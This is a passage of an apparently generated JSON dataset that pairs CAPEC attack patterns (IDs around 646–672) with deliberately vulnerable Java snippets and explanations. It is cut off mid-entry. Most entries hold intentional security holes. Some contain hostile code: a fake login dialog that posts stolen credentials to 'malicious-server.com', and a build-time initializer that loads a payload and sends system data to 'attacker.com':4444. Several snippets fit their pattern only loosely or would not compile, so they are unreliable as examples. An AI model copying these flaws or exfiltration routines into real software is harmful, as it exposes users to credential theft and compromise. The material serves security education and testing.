        "code_snippet": "public class DeviceMonitor {\n    private static final String REGISTRY_PATH = \"SYSTEM\\\\CurrentControlSet\\\\Enum\\\\USBSTOR\";\n    \n    public static void listConnectedDevices() {\n        try {\n            Process process = Runtime.getRuntime().exec(\"reg query \" + REGISTRY_PATH);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (line.contains(\"VID\")) {\n                    System.out.println(\"Found USB device: \" + line);\n                    // Store device information in plaintext log file\n                    FileWriter fw = new FileWriter(\"device_log.txt\", true);\n                    fw.write(line + \"\\n\");\n                    fw.close();\n                }\n            }\n            \n            // Check for iOS device backups in default locations\n            File iosBackups = new File(System.getProperty(\"user.home\") + \"/AppData/Roaming/Apple/MobileSync/Backup/\");\n            if (iosBackups.exists()) {\n                System.out.println(\"iOS backup found at: \" + iosBackups.getAbsolutePath());\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code snippet demonstrates information exposure by monitoring and logging connected USB devices and iOS backups. It queries the Windows registry for USB device information and searches for iOS backups, storing this sensitive system information in plaintext logs. The code doesn't implement any access controls or encryption, potentially exposing device information to unauthorized actors."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "public class RegistryAccess {\n    private static final String REGISTRY_PATH = \"SOFTWARE\\\\MyApp\";\n    private static final String SENSITIVE_KEY = \"api_key\";\n    \n    public static void storeCredentials(String apiKey) {\n        try {\n            WinReg.HKEY_LOCAL_MACHINE.createSubKey(REGISTRY_PATH)\n                .setValue(SENSITIVE_KEY, apiKey);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String getCredentials() {\n        try {\n            // No authorization check before accessing sensitive data\n            return WinReg.HKEY_LOCAL_MACHINE.openKey(REGISTRY_PATH)\n                .getStringValue(SENSITIVE_KEY);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public static void dumpRegistryInfo() {\n        try {\n            // Dumps all registry values without checking user permissions\n            WinReg.HKEY_LOCAL_MACHINE.openKey(REGISTRY_PATH)\n                .values()\n                .forEach(System.out::println);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code stores sensitive information (API key) in the Windows Registry in cleartext and provides methods to access it without proper authorization checks. The code allows unrestricted access to registry values and system information, potentially exposing sensitive data to unauthorized users. It lacks access control mechanisms and stores credentials in an insecure manner."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "public class ScreenRecorder {\n    private static Robot robot;\n    private static String logPath = \"/var/log/screenshots/\";\n\n    static {\n        try {\n            robot = new Robot();\n        } catch (AWTException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void captureAndSave(String username, String password) {\n        try {\n            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());\n            BufferedImage capture = robot.createScreenCapture(screenRect);\n            \n            // Save screenshot with sensitive data in filename\n            String fileName = String.format(\"screen_%s_%s.png\", username, password);\n            File output = new File(logPath + fileName);\n            ImageIO.write(capture, \"png\", output);\n\n            // Transmit screenshot over network in cleartext\n            Socket socket = new Socket(\"remote-server.com\", 8080);\n            ImageIO.write(capture, \"png\", socket.getOutputStream());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code performs screen captures and stores them insecurely. It violates multiple security principles by saving sensitive credentials in filenames, storing screenshots in a predictable location, transmitting screen captures in cleartext over the network, and failing to implement proper access controls. The code allows capturing potentially sensitive information displayed on screen and exposes it through various channels."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "public class FileHandler {\n    public void processUploadedFile(String fileName) {\n        String fileExtension = fileName.substring(fileName.lastIndexOf(\".\"));\n        \n        if (fileExtension.equals(\".txt\")) {\n            processTextFile(fileName);\n        } else if (fileExtension.equals(\".exe\")) {\n            rejectExecutable(fileName);\n        }\n        \n        // Vulnerable: doesn't handle trailing spaces\n        // Attacker can upload \"malicious.exe .txt\"\n        File file = new File(\"uploads/\" + fileName);\n        if (file.exists()) {\n            // Process the file without proper validation\n            executeFileBasedOnExtension(file);\n        }\n    }\n    \n    private void executeFileBasedOnExtension(File file) {\n        String name = file.getName();\n        if (name.endsWith(\".txt\")) {\n            // Process as text\n            readTextFile(file);\n        }\n    }\n}",
        "description": "This code is vulnerable to file extension manipulation through trailing spaces. It processes files based on their extensions without properly sanitizing or validating the filename. An attacker could upload a file named 'malicious.exe .txt' which might bypass security checks for executable files while still maintaining executable capabilities. The code also fails to handle Windows 8.3 filename equivalents and doesn't properly validate or sanitize filenames containing spaces."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "public class FileUploadServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String uploadDir = \"/var/www/html/uploads/\";\n        Part filePart = request.getPart(\"file\");\n        String fileName = filePart.getSubmittedFileName();\n        \n        // No authentication check\n        // No file type validation\n        // No permission verification\n        File file = new File(uploadDir + fileName);\n        try (InputStream input = filePart.getInputStream();\n             OutputStream output = new FileOutputStream(file)) {\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = input.read(buffer)) > 0) {\n                output.write(buffer, 0, length);\n            }\n        }\n        file.setExecutable(true); // Dangerous permission setting\n        response.getWriter().println(\"File uploaded to: \" + file.getAbsolutePath());\n    }\n}",
        "description": "This code demonstrates a vulnerable file upload implementation that allows unrestricted file uploads without proper authentication, file type validation, or permission checks. The code accepts any file, saves it with the original filename in a web-accessible directory, and makes it executable. This could allow an attacker to upload and execute malicious files (like web shells) on the server."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "public class SensitiveDataHandler {\n    private static final String SECRET_KEY = \"my_secret_key_123\";\n    \n    public void processUserData(String userData) {\n        // Store sensitive data in plaintext files\n        try {\n            FileWriter writer = new FileWriter(\"user_data.txt\", true);\n            writer.write(\"User Data: \" + userData + \", Key: \" + SECRET_KEY + \"\\n\");\n            writer.close();\n            \n            // Transmit data in cleartext over socket\n            Socket socket = new Socket(\"remote-server.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(SECRET_KEY + \":\" + userData);\n            \n            // Store timing information in shared resource\n            long processingTime = System.currentTimeMillis();\n            new FileWriter(\"timing.txt\").write(String.valueOf(processingTime));\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues related to sensitive data exposure. It stores a secret key in plaintext, writes sensitive data to an unencrypted file, transmits data in cleartext over a network socket, and creates a potential covert channel through timing information in a shared file. The code lacks proper encryption, secure storage mechanisms, and protection against physical side-channel attacks."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "public class AuthenticationService {\n    private static final String STORED_PASSWORD_HASH = \"5f4dcc3b5aa765d61d8327deb882cf99\";\n    private static Map<String, String> ticketCache = new HashMap<>();\n\n    public boolean authenticate(String username, String password) {\n        String hashedPassword = md5Hash(password);\n        return hashedPassword.equals(STORED_PASSWORD_HASH);\n    }\n\n    public String issueKerberosTicket(String username) {\n        String ticket = generateTicket(username);\n        ticketCache.put(username, ticket);\n        return ticket;\n    }\n\n    public boolean validateTicket(String username, String ticket) {\n        return ticket.equals(ticketCache.get(username));\n    }\n\n    private String generateTicket(String username) {\n        return Base64.getEncoder().encodeToString(\n            (username + System.currentTimeMillis()).getBytes()\n        );\n    }\n\n    private String md5Hash(String input) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] hash = md.digest(input.getBytes());\n            return DatatypeConverter.printHexBinary(hash).toLowerCase();\n        } catch (NoSuchAlgorithmException e) {\n            return \"\";\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable Kerberos-style authentication with multiple security issues: it uses MD5 for password hashing, implements single-factor authentication, lacks password aging mechanisms, doesn't limit authentication attempts, stores tickets in an unprotected cache, and is susceptible to replay attacks due to simple ticket validation. The tickets are generated using a predictable pattern and stored in memory without encryption or proper access controls."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "public class AuthenticationManager {\n    private static final String ADMIN_USERNAME = \"admin\";\n    private static final String ADMIN_PASSWORD = \"password123\";\n    \n    public boolean authenticate(String username, String password) {\n        // Store credentials in plain text\n        String storedCredentials = username + \":\" + password;\n        \n        // No rate limiting for login attempts\n        // Single factor authentication only\n        // No password expiration check\n        if (username.equals(ADMIN_USERNAME) && password.equals(ADMIN_PASSWORD)) {\n            return true;\n        }\n        return false;\n    }\n    \n    public void saveCredentials(String username, String password) {\n        // Storing credentials in plaintext in a file\n        try {\n            FileWriter fw = new FileWriter(\"credentials.txt\");\n            fw.write(username + \":\" + password);\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including hardcoded credentials, plain text storage, no rate limiting for authentication attempts, single-factor authentication, and no password aging mechanism. The code stores and compares credentials in plain text, lacks any brute force protection, and doesn't implement password expiration policies."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "public class FakeLoginDialog extends JDialog {\n    private JTextField usernameField;\n    private JPasswordField passwordField;\n    private static final String HARD_CODED_ADMIN = \"admin\";\n    private static final String HARD_CODED_PASS = \"default123\";\n\n    public FakeLoginDialog() {\n        setTitle(\"System Security Update Required\");\n        setLayout(new GridLayout(3, 2));\n        \n        usernameField = new JTextField();\n        passwordField = new JPasswordField();\n        \n        add(new JLabel(\"Username:\"));\n        add(usernameField);\n        add(new JLabel(\"Password:\"));\n        add(passwordField);\n        \n        JButton submitButton = new JButton(\"Login\");\n        submitButton.addActionListener(e -> {\n            String username = usernameField.getText();\n            String password = new String(passwordField.getPassword());\n            \n            // Store credentials in plain text\n            try {\n                FileWriter writer = new FileWriter(\"credentials.txt\", true);\n                writer.write(username + \":\" + password + \"\\n\");\n                writer.close();\n                \n                // Send credentials over unsecured connection\n                URL url = new URL(\"http://malicious-server.com/collect\");\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                String data = \"username=\" + username + \"&password=\" + password;\n                conn.setDoOutput(true);\n                conn.getOutputStream().write(data.getBytes());\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n        });\n        \n        add(submitButton);\n        setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);\n        pack();\n        setLocationRelativeTo(null);\n    }\n}",
        "description": "This code creates a malicious dialog that impersonates a system login prompt. It uses hard-coded credentials, stores captured credentials in plain text, and transmits them insecurely. The dialog appears legitimate to users but actually harvests their login information."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "public class FileProcessor {\n    private static final String TEMP_DIR = \"/tmp/\";\n    private static final String LOG_FILE = \"/var/log/app.log\";\n    \n    public void processUploadedFile(String fileName, byte[] fileData) {\n        try {\n            // Create temporary file with uploaded content\n            String tempFile = TEMP_DIR + fileName;\n            FileOutputStream fos = new FileOutputStream(tempFile);\n            fos.write(fileData);\n            fos.close();\n            \n            // Process file based on extension\n            if (fileName.endsWith(\".conf\")) {\n                Properties props = new Properties();\n                props.load(new FileInputStream(tempFile));\n                String dbPassword = props.getProperty(\"db.password\");\n                \n                // Log sensitive information\n                FileWriter logWriter = new FileWriter(LOG_FILE, true);\n                logWriter.write(\"Processed config file: \" + fileName + \", DB Password: \" + dbPassword + \"\\n\");\n                logWriter.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it processes uploaded files based solely on file extension, stores sensitive information in temporary files without proper cleanup, logs sensitive data, and doesn't implement size restrictions on uploaded files. The code creates temporary files in a predictable location and doesn't validate file content, making it susceptible to various attacks including file hash manipulation and sensitive data exposure."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "public class CustomerSupport {\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private Map<String, String> userCredentials = new HashMap<>();\n\n    public boolean authenticateUser(String phoneNumber, String userInput) {\n        // No rate limiting on authentication attempts\n        if (!loginAttempts.containsKey(phoneNumber)) {\n            loginAttempts.put(phoneNumber, 0);\n        }\n        loginAttempts.put(phoneNumber, loginAttempts.get(phoneNumber) + 1);\n\n        // Storing sensitive data in plaintext\n        userCredentials.put(phoneNumber, userInput);\n\n        // No verification of caller ID or phone number authenticity\n        return processCustomerRequest(phoneNumber, userInput);\n    }\n\n    private boolean processCustomerRequest(String phoneNumber, String userInput) {\n        // Exposing sensitive information without proper verification\n        String customerData = String.format(\"Account: %s, SSN: %s, PIN: %s\",\n            getUserAccount(phoneNumber),\n            getUserSSN(phoneNumber),\n            getUserPIN(phoneNumber));\n\n        // Log sensitive data without encryption\n        System.out.println(\"Customer data accessed: \" + customerData);\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates a flawed customer support authentication system that's susceptible to voice phishing attacks. It lacks proper caller verification, has no protection against multiple authentication attempts, stores credentials insecurely, and exposes sensitive personal information without adequate authorization checks. The code fails to implement proper authentication mechanisms and freely exposes private customer data, making it vulnerable to social engineering attacks through voice channels."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "public class AutoUpdater {\n    private String updateServerUrl;\n\n    public AutoUpdater(String serverUrl) {\n        this.updateServerUrl = serverUrl;\n    }\n\n    public void checkForUpdates() {\n        try {\n            URL url = new URL(updateServerUrl + \"/check_update.php\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(conn.getInputStream()));\n\n            String updateInfo = reader.readLine();\n            if(updateInfo != null && updateInfo.contains(\"update_available\")) {\n                downloadAndInstallUpdate();\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void downloadAndInstallUpdate() {\n        try {\n            URL updateUrl = new URL(updateServerUrl + \"/get_update.jar\");\n            FileUtils.copyURLToFile(updateUrl, new File(\"update.jar\"));\n            \n            // Directly execute downloaded JAR without verification\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements an auto-update mechanism that downloads and executes updates without proper verification. It lacks integrity checks on downloaded code (CWE-494), blindly trusts the update server URL (CWE-602), and executes downloaded content without verification (CWE-506). The code could be exploited by an attacker who spoofs the update server to distribute malicious updates."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "public class RootDetectionBypass {\n    static {\n        System.loadLibrary(\"external_lib\");\n    }\n\n    private boolean isDeviceRooted() {\n        String command = System.getProperty(\"user.input\") + \" su\";\n        try {\n            Runtime.getRuntime().exec(command);\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public void handleCustomURL(String url) {\n        if(url.startsWith(\"myapp://load\")) {\n            String libraryPath = url.substring(\"myapp://load\".length());\n            try {\n                DexClassLoader loader = new DexClassLoader(\n                    libraryPath,\n                    context.getCacheDir().getAbsolutePath(),\n                    null,\n                    ClassLoader.getSystemClassLoader()\n                );\n                Class<?> loadedClass = loader.loadClass(\"com.hook.RootBypass\");\n                loadedClass.getDeclaredMethod(\"hook\").invoke(null);\n            } catch (Exception e) {}\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates root detection bypass through dynamic code loading and command execution. It loads an external library without verification, executes OS commands with unvalidated input, and implements an unsafe custom URL handler that allows arbitrary code loading. The code exposes system information and lacks proper authorization checks, making it susceptible to root/jailbreak detection bypass attacks."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "public class MobileApp {\n    private static final String SENSITIVE_KEY = \"s3cr3t_k3y_123\";\n    private static boolean isDebugEnabled = true;\n\n    static {\n        // Debug flag accidentally left enabled in production\n        if(isDebugEnabled) {\n            enableDebugLogging();\n        }\n    }\n\n    public static boolean checkRootStatus() {\n        if(isDebugEnabled) {\n            // Debug backdoor allowing bypass of root detection\n            return false;\n        }\n\n        // Actual root detection logic\n        String[] pathsToCheck = {\"/system/app/Superuser.apk\", \"/system/xbin/su\"};\n        for(String path : pathsToCheck) {\n            if(new File(path).exists()) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    private static void enableDebugLogging() {\n        try {\n            // Exposes sensitive debug information\n            System.out.println(\"Debug Mode: ON\");\n            System.out.println(\"Encryption Key: \" + SENSITIVE_KEY);\n            System.out.println(\"System Details: \" + System.getProperties());\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        if(!checkRootStatus()) {\n            System.out.println(\"Device not rooted, proceeding with execution...\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a mobile application with debug code left enabled in production, exposing sensitive information and providing a backdoor to bypass root detection. The code includes hardcoded debug flags, exposed system information, and inadequate protection against debugging and binary manipulation. When debug mode is enabled, it leaks sensitive information including encryption keys and system properties, while also providing a way to bypass root detection checks."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "public class BrowserProxy {\n    private static String TRUSTED_SERVER = \"https://trusted-server.com\";\n    \n    public static void downloadAndExecute() {\n        try {\n            // Vulnerable: No origin verification or integrity check\n            URL url = new URL(TRUSTED_SERVER + \"/download/script.jar\");\n            URLConnection conn = url.openConnection();\n            \n            // Vulnerable: No SSL/TLS verification\n            ((HttpURLConnection) conn).setSSLSocketFactory(\n                (SSLSocketFactory) SSLSocketFactory.getDefault());\n            \n            // Vulnerable: Direct execution of downloaded code\n            InputStream in = conn.getInputStream();\n            File tempFile = File.createTempFile(\"script\", \".jar\");\n            FileOutputStream out = new FileOutputStream(tempFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            // Vulnerable: Execute downloaded JAR without verification\n            URLClassLoader classLoader = new URLClassLoader(\n                new URL[]{tempFile.toURI().toURL()});\n            Class<?> loadedClass = classLoader.loadClass(\"Script\");\n            loadedClass.getMethod(\"execute\").invoke(null);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable browser-proxy implementation that downloads and executes code from a supposedly trusted server without proper security measures. It lacks proper endpoint verification, integrity checks on downloaded code, and proper channel security. The code is susceptible to man-in-the-middle attacks, code injection, and malicious code execution."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "public class SecretDataAccess {\n    private static final int CACHE_LINE_SIZE = 64;\n    private static byte[] secretData = new byte[1024];\n    private static byte[] probe = new byte[256 * CACHE_LINE_SIZE];\n    \n    public static int speculativeAccess(int index) {\n        int result = 0;\n        if (index < secretData.length) {  // bounds check might be bypassed\n            // Potential speculative execution vulnerability\n            int secretValue = secretData[index] & 0xff;\n            // Create timing side-channel\n            result = probe[secretValue * CACHE_LINE_SIZE];\n        }\n        return result;\n    }\n    \n    public static void exploitSpeculation(int maliciousIndex) {\n        // Prime cache\n        for(int i = 0; i < probe.length; i += CACHE_LINE_SIZE) {\n            probe[i] = 1;\n        }\n        \n        // Force speculation\n        if(System.nanoTime() % 2 == 0) {  // unpredictable condition\n            speculativeAccess(maliciousIndex);\n        }\n    }\n}",
        "description": "This code demonstrates a Spectre-style vulnerability where speculative execution can be exploited to access sensitive data. The code uses array bounds checks that could be speculatively bypassed, and creates a timing side-channel through cache access patterns. The probe array is used to leak information about the secret data through cache timing differences. The vulnerability allows transient execution to potentially expose sensitive information through microarchitectural state changes."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "public class ImageDownloader {\n    @GetMapping(\"/fetch-image\")\n    public ResponseEntity<byte[]> fetchImage(@RequestParam String imageUrl) {\n        try {\n            URL url = new URL(imageUrl);\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            byte[] imageBytes = is.readAllBytes();\n            return ResponseEntity.ok().body(imageBytes);\n        } catch (IOException e) {\n            return ResponseEntity.status(HttpStatus.BAD_REQUEST).build();\n        }\n    }\n}",
        "description": "This code is vulnerable to Server-Side Request Forgery (SSRF) as it blindly accepts any URL from the user input and makes a server-side request to fetch the image. An attacker could provide internal network URLs or manipulate the URL parameter to access sensitive internal resources or make requests to arbitrary hosts using the server's identity. The code lacks proper input validation and URL whitelisting."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "public class ThunderboltController {\n    private boolean isAuthenticated = false;\n    private byte[] firmwareData;\n    private static final String DEFAULT_KEY = \"1234567890\";\n\n    public ThunderboltController() {\n        // Initialize with insecure default key\n        this.firmwareData = loadFirmwareData(DEFAULT_KEY);\n    }\n\n    public boolean updateFirmware(byte[] newFirmware) {\n        // Missing integrity check for firmware data\n        this.firmwareData = newFirmware;\n        return true;\n    }\n\n    public boolean authenticateDevice(String deviceId) {\n        // Weak authentication without proper verification\n        isAuthenticated = true;\n        return true;\n    }\n\n    public byte[] readMemory(int address, int length) {\n        // No authorization check for memory access\n        byte[] data = new byte[length];\n        System.arraycopy(firmwareData, address, data, 0, length);\n        return data;\n    }\n\n    private byte[] loadFirmwareData(String key) {\n        // No verification of firmware authenticity\n        return new byte[1024];\n    }\n\n    public void flashSPIMemory(byte[] data) {\n        // Alternative path without authentication check\n        if (data != null) {\n            this.firmwareData = data;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a Thunderbolt controller implementation with multiple security flaws including insufficient data authenticity verification, missing integrity checks, authentication bypass, insecure defaults, and missing authorization checks. The code allows unrestricted firmware updates, memory access without proper authorization, and contains a weak authentication mechanism that can be bypassed."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "public class VulnerableBluetoothServer {\n    private static BluetoothServerSocket serverSocket;\n    private static boolean isRunning = true;\n\n    public static void main(String[] args) {\n        try {\n            serverSocket = BluetoothAdapter.getDefaultAdapter()\n                .listenUsingL2CAPChannel();\n\n            while (isRunning) {\n                BluetoothSocket socket = serverSocket.accept();\n                byte[] buffer = new byte[65535];\n                InputStream input = socket.getInputStream();\n\n                // Vulnerable: No message integrity check\n                while (input.read(buffer) != -1) {\n                    // Process data without verification\n                    processData(buffer);\n                }\n\n                // Resource leak: Socket not properly closed\n                if (socket.isConnected()) {\n                    continue;\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processData(byte[] data) {\n        // Process received data without authentication\n        // Vulnerable to replay attacks\n        handleBluetoothCommand(data);\n    }\n\n    private static void handleBluetoothCommand(byte[] command) {\n        // Direct socket usage without framework protection\n        // No encryption of sensitive data\n    }\n}",
        "description": "This code demonstrates a vulnerable Bluetooth server implementation that accepts L2CAP connections. It contains multiple vulnerabilities including: lack of resource cleanup (CWE-404), no message integrity checks (CWE-924), cleartext transmission (CWE-319), susceptibility to replay attacks (CWE-294), and direct socket usage (CWE-246). The server accepts large packets without proper validation, making it vulnerable to DoS attacks through Bluetooth flooding."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "public class BluetoothConnectionManager {\n    private Map<String, BluetoothDevice> trustedDevices = new HashMap<>();\n\n    public boolean authenticateDevice(BluetoothDevice device) {\n        String macAddress = device.getAddress();\n        \n        // Vulnerable: Only checking MAC address for authentication\n        if (trustedDevices.containsKey(macAddress)) {\n            return true;\n        }\n        return false;\n    }\n\n    public void handleConnection(BluetoothDevice device) {\n        if (authenticateDevice(device)) {\n            // No additional verification of device identity\n            establishSecureConnection(device);\n        }\n    }\n\n    private void establishSecureConnection(BluetoothDevice device) {\n        // Perform privileged operations without additional verification\n        device.createBond();\n        // Send sensitive data\n        sendData(device, \"sensitive_information\");\n    }\n}",
        "description": "This code demonstrates vulnerable Bluetooth authentication that relies solely on MAC address verification. The code is susceptible to MAC address spoofing attacks as it doesn't implement additional authentication mechanisms or proper verification of the device's identity. An attacker can bypass authentication by spoofing a trusted device's MAC address."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "public class BluetoothConnection {\n    private static final int MIN_ENTROPY_BITS = 4;\n    \n    public boolean establishConnection(BluetoothDevice device) {\n        // Weak entropy negotiation\n        int entropyBits = Math.min(device.getPreferredEntropyBits(), MIN_ENTROPY_BITS);\n        \n        byte[] key = generateKey(entropyBits);\n        SecretKey secretKey = new SecretKeySpec(key, \"DES\"); // Using weak encryption\n        \n        try {\n            // Insecure key exchange without proper authentication\n            sendKeyOverBluetooth(device, key);\n            \n            // No validation of device authenticity\n            if(device.isConnected()) {\n                return true;\n            }\n        } catch (Exception e) {\n            return false;\n        }\n        return false;\n    }\n    \n    private byte[] generateKey(int entropyBits) {\n        // Weak key generation with low entropy\n        byte[] key = new byte[8];\n        Random random = new Random();\n        random.nextBytes(key);\n        return key;\n    }\n    \n    private void sendKeyOverBluetooth(BluetoothDevice device, byte[] key) {\n        // Direct transmission without proper encryption\n        device.send(key);\n    }\n}",
        "description": "This vulnerable code demonstrates insecure Bluetooth key negotiation by using weak entropy bits, insufficient authentication, and unprotected key exchange. It allows for algorithm downgrade attacks by accepting a minimum entropy value and uses DES encryption, which is considered weak. The code lacks proper validation of device authenticity and sends encryption keys directly over Bluetooth without adequate protection, making it susceptible to man-in-the-middle attacks."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "public class UpdateManager {\n    private static final String UPDATE_SERVER = \"http://update-server.com\";\n    private static boolean verifySignature = false; // Disabled signature verification\n\n    public static void downloadAndInstallUpdate() {\n        try {\n            // Download update without verification\n            URL url = new URL(UPDATE_SERVER + \"/latest/update.jar\");\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            \n            // Save and execute update without validation\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            \n            // Execute update with elevated privileges\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates an insecure software update mechanism that downloads and executes updates without proper verification. It disables signature verification, downloads from a hardcoded URL without SSL verification, and executes the update with elevated privileges. The code makes the system vulnerable to malicious updates by not validating the source or content of the update, potentially allowing attackers to inject malicious code through compromised updates."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "public class CompromisedBuildTool {\n    static {\n        try {\n            // Malicious code injected during build process\n            byte[] payload = new byte[]{0x6A, 0x61, 0x76, 0x61, 0x2F, 0x6C, 0x61, 0x6E, 0x67};\n            ClassLoader loader = ClassLoader.getSystemClassLoader();\n            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\n            m.setAccessible(true);\n            Class<?> maliciousClass = (Class<?>) m.invoke(loader, \"MaliciousPayload\", payload, 0, payload.length);\n            maliciousClass.newInstance();\n            \n            // Expose system information through covert channel\n            String systemInfo = System.getProperties().toString();\n            new java.net.Socket(\"attacker.com\", 4444).getOutputStream().write(systemInfo.getBytes());\n        } catch (Exception e) {\n            // Silently fail to avoid detection\n        }\n    }\n    \n    public static void securityCheck() {\n        // Security-critical code that might be optimized away\n        volatile boolean securityFlag = false;\n        // Complex security calculation\n        for(int i = 0; i < 1000; i++) {\n            securityFlag |= checkSecurity();\n        }\n    }\n    \n    private static boolean checkSecurity() {\n        return System.getSecurityManager() != null;\n    }\n}",
        "description": "This code demonstrates a compromised build tool scenario where malicious code is injected during the build process. It includes a static initializer that loads malicious bytecode, exposes system information to unauthorized parties, and contains security-critical code that could be removed by compiler optimization. The code uses reflection to load unauthorized classes and establishes network connections to exfiltrate sensitive data."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "public class SecurityTokenManager {\n    private static final String DEFAULT_KEY = \"default_key_123\";\n    private static String securityKey = DEFAULT_KEY;\n    \n    public static class Token {\n        public String id;\n        public int accessLevel;\n        \n        public Token(String id, int accessLevel) {\n            this.id = id;\n            this.accessLevel = accessLevel;\n        }\n    }\n    \n    public static Token generateToken(String deviceId) {\n        // Insecure token generation using predictable pattern\n        String tokenId = deviceId + System.currentTimeMillis();\n        return new Token(tokenId, 3); // Default high access level\n    }\n    \n    public static boolean validateToken(Token token) {\n        // No proper validation of token origin\n        return token != null && token.accessLevel > 0;\n    }\n    \n    public static void setSecurityKey(String newKey) {\n        // No validation of caller's authority\n        securityKey = newKey;\n    }\n    \n    public static boolean accessSecureArea(Token token, String area) {\n        // No physical access verification\n        // No proper token validation\n        return validateToken(token);\n    }\n}",
        "description": "This vulnerable code demonstrates a flawed security token implementation in a hardware-oriented system. It shows improper token generation, inadequate access control, and lack of proper security validation mechanisms. The code fails to properly protect security tokens, uses weak generation methods, and doesn't implement proper physical access controls, making it susceptible to unauthorized access and manipulation."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
